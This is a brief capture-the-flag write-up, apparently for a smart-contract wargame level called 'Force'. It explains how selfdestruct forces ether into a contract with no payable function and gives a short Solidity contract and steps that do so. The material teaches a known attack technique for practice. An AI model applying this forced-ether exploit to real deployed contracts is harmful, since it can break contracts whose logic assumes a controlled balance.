Level 7: Force

Objective:

The goal of this level is to make the balance of the contract greater than zero.

Concept:

selfdestruct() to send Ether forcibly

Explanation:

A contract can selfdestruct sending its ether to any address even if that address is a contract with no payable function.

Solution:

Deploy this contract:

contract ForceSend {
  constructor() payable {}
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}

Send ether to it then call destroy(contrcats address).

Key Takeaways:

selfdestruct bypasses payable modifiers and ether can be forced into any contract.
